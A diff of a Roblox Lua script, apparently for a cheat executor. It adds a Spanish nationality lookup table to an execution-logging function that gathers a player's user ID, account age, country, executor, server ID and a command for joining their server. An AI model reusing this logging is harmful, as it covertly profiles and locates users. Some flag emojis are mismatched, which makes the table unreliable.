@@ -22,6 +22,104 @@ LocalPlayer.CharacterAdded:Connect(function(character)
     Humanoid = character:WaitForChild("Humanoid")
 end)
 
+local countryCode = game:GetService("LocalizationService"):GetCountryRegionForPlayer(LocalPlayer)
+
+local countryToNationality = {
+ ["AF"] = "🇦🇫 Afgano",
+ ["AL"] = "🇦🇱 Albanés",
+ ["DZ"] = "🇩🇿 Argelino",
+ ["AR"] = "🇦🇷 Argentino",
+ ["AU"] = "🇦🇺 Australiano",
+ ["AT"] = "🇦🇹 Austríaco",
+ ["BH"] = "🇧🇭 Bahreiní",
+ ["BD"] = "🇧🇪 Bangladesí",
+ ["BE"] = "🇧🇪 Belga",
+ ["BR"] = "🇧🇷 Brasileño",
+ ["BG"] = "🇧🇬 Búlgaro",
+ ["CA"] = "🇨🇦 Canadiense",
+ ["CL"] = "🇨🇱 Chileno",
+ ["CN"] = "🇨🇳 Chino",
+ ["CO"] = "🇨🇴 Colombiano",
+ ["CR"] = "🇨🇷 Costarricense",
+ ["HR"] = "🇭🇷 Croata",
+ ["CU"] = "🇨🇺 Cubano",
+ ["CZ"] = "🇨🇿 Checo",
+ ["DK"] = "🇩🇰 Danés",
+ ["EG"] = "🇪🇬 Egipcio",
+ ["SV"] = "🇸🇻 Salvadoreño",
+ ["FI"] = "🇫🇮 Finlandés",
+ ["FR"] = "🇫🇷 Francés",
+ ["DE"] = "🇩🇪 Alemán",
+ ["GR"] = "🇬🇷 Griego",
+ ["GT"] = "🇬🇹 Guatemalteco",
+ ["HT"] = "🇭🇹 Haitiano",
+ ["HN"] = "🇭🇳 Hondureño",
+ ["HU"] = "🇭🇺 Húngaro",
+ ["IN"] = "🇮🇳 Indio",
+ ["ID"] = "🇮🇩 Indonesio",
+ ["IR"] = "🇮🇷 Iraní",
+ ["IQ"] = "🇮🇶 Iraquí",
+ ["IE"] = "🇮🇪 Irlandés",
+ ["IL"] = "🇮🇱 Israelí",
+ ["IT"] = "🇮🇹 Italiano",
+ ["JP"] = "🇯🇵 Japonés",
+ ["JO"] = "🇰🇷 Jordaniano",
+ ["KR"] = "🇰🇷 Surcoreano",
+ ["KW"] = "🇰🇼 Kuwaití",
+ ["LB"] = "🇱🇧 Libanés",
+ ["MY"] = "🇲🇾 Malayo",
+ ["MX"] = "🇲🇽 Mexicano",
+ ["MA"] = "🇲🇦 Marroquí",
+ ["NL"] = "🇳🇱 Neerlandés",
+ ["NZ"] = "🇳🇿 Neozelandés",
+ ["NI"] = "🇳🇮 Nicaragüense",
+ ["NG"] = "🇳🇬 Nigeriano",
+ ["NO"] = "🇳🇴 Noruego",
+ ["OM"] = "🇵🇰 Omaní",
+ ["PK"] = "🇵🇰 Pakistaní",
+ ["PA"] = "🇵🇦 Panameño",
+ ["PY"] = "🇵🇾 Paraguayo",
+ ["PE"] = "🇵🇪 Peruano",
+ ["PH"] = "🇵🇭 Filipino",
+ ["PL"] = "🇵🇱 Polaco",
+ ["PT"] = "🇵🇹 Portugués",
+ ["QA"] = "🇶🇦 Qatarí",
+ ["RO"] = "🇷🇴 Rumano",
+ ["RU"] = "🇷🇺 Ruso",
+ ["SA"] = "🇸🇦 Saudí",
+ ["RS"] = "🇷🇸 Serbio",
+ ["SG"] = "🇸🇬 Singapurense",
+ ["ZA"] = "🇿🇦 Sudafricano",
+ ["ES"] = "🇪🇸 Español",
+ ["LK"] = "🇱🇰 Sri Lankés",
+ ["SE"] = "🇸🇪 Sueco",
+ ["CH"] = "🇨🇭 Suizo",
+ ["SY"] = "🇸🇾 Sirio",
+ ["TW"] = "🇹🇼 Taiwanés",
+ ["TH"] = "🇹🇭 Tailandés",
+ ["TN"] = "🇹🇳 Tunecino",
+ ["TR"] = "🇹🇷 Turco",
+ ["UA"] = "🇺🇦 Ucraniano",
+ ["AE"] = "🇦🇪 Emiratí",
+ ["GB"] = "🇬🇧 Británico",
+ ["US"] = "🇺🇸 Estadounidense",
+ ["UY"] = "🇺🇾 Uruguayo",
+ ["VE"] = "🇻🇪 Venezolano",
+ ["VN"] = "🇻🇳 Vietnamita",
+}
+
+local function convertCountry()
+	local countryPlayer = countryToNationality[countryCode]
+	if countryPlayer then
+		return countryPlayer
+	else
+		local var = "???"
+		return var
+	end
+end
+
+local country = convertCountry()
+
 local function ExecuteLog()
     local placeId = game.PlaceId
     local jobId = game.JobId
@@ -39,7 +137,7 @@ local function ExecuteLog()
                 {name = "🆔 User ID", value = tostring(userId), inline = false},
                 {name = "📝 Account Age", value = LocalPlayer.AccountAge .. " Days", inline = false},
                 {name = "🌎 Language", value = LocalPlayer.LocaleId, inline = false},
-                {name = "🌎 Country", value = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(LocalPlayer), inline = false},
+                {name = "🌎 Country", value = country, inline = false},
                 {name = "💻 Executor", value = identifyexecutor and identifyexecutor() or "Unknown", inline = false},
                 {name = "🌐 Server JobId", value = jobId, inline = false},
                 {name = "📌 Teleport", value = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..placeId..", \""..jobId.."\")", inline = false},
